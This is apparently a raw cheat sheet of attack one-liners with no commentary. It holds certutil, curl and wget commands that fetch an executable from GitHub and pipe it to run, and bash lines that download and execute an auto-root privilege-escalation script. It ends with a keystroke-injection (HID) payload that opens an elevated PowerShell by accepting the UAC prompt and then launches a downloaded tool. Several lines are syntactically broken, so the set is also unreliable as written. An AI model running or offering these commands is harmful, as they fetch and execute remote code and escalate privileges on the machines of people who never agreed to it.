

certutil -urlcache -split -f https://github.com/blkht666/lsd/rfi.exe | exe

curl https://github.com/blkht666/lsd/rfi.exe | exe

wget https://github.com/blkht666/lsd/rfi.exe | exe

bash < <(curl https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)

bash < <(wget https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)

bash < <(curl https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)

bash < <(wget https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)

REM start of script
REM
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'https://github.com/realalexandergeorgiev/tempracer/releases/download/1/TempRacer.exe'; $file = 'tempracer.exe'; $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
